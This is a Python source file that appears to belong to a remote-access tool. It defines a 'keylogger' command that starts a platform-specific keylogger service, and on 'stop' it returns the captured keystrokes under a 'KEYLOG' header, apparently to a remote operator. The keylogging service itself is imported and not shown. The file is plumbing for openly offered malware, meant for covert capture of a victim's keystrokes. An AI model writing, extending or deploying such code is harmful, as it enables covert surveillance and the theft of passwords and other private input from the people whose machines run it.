import os
from .base_command import BaseCommand

# Import the correct service depending on the OS
if os.name == 'posix':
    from ..client.keylogger_linux import KeyloggerService
else:
    from ..client.keylogger_service import KeyloggerService


class KeyloggerCommand(BaseCommand):
    name = "keylogger"
    description = "Start or stop the keylogger"

    _service = KeyloggerService()

    def execute(self, args: str) -> str:
        args = args.strip().lower()

        if args == "start":
            result = self._service.start()
            return f"TEXT\n{result}\nEOF"

        if args == "stop":
            data = self._service.stop()
            return f"KEYLOG\nOK\n{data}\nEOF"

        return "TEXT\nUsage:\nkeylogger start\nkeylogger stop\nEOF"
